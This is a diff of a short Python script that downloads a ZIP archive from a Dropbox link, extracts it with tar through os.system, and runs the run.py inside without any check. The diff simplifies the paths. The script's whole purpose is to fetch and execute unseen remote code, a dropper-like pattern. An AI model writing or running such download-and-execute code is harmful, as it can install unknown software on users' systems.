@@ -3,10 +3,7 @@ import requests
 
 # Step 1: Download the ZIP file
 url = "https://www.dropbox.com/scl/fi/6y2xhv0uw13zdb3v1h6xw/ulo.zip?rlkey=qafy53yxtrd9rgztav7n1o9ub&dl=1"
-drop_folder = "C:\\Dirs\\ulo"  # Adjust your target directory here
-if not os.path.exists(drop_folder):
-    os.makedirs(drop_folder)
-filename = os.path.join(drop_folder, "ulo.zip")
+filename = os.path.join("ulo.zip")
 with requests.get(url, stream=True) as r:
     r.raise_for_status()
     with open(filename, 'wb') as f:
@@ -17,7 +14,7 @@ print("Downloaded the ZIP file.")
 
 # Step 2: Extract the ZIP file
 # Use the 'tar' command on Windows, ensure tar is available on your system; else, you may need other utilities like 7-Zip
-extract_command = f"cd /d {drop_folder} && tar -xf {filename}"
+extract_command = f"tar -xf {filename}"
 print(extract_command)
 os.system(extract_command)
 print("Extracted the ZIP file.")
@@ -25,9 +22,7 @@ print("Extracted the ZIP file.")
 # Step 3: Execute the program
 # Modify paths as necessary according to the actual structure inside your ZIP file
 # This assumes 'run.py' is in the root of the 'ulo' folder after extraction
-script_path = os.path.join(drop_folder, "ulo", "run.py")  # Adjust this path as needed
-python_path = os.path.join(drop_folder, "ulo", "python.exe")  # Adjust this path as needed
-print(f'cd /d {drop_folder} && python {script_path}')
-os.system(f'{python_path} {script_path}')
+print(f'Executing the program...')
+os.system(f'cd ulo && python run.py')
 
 print("Executed the program.")
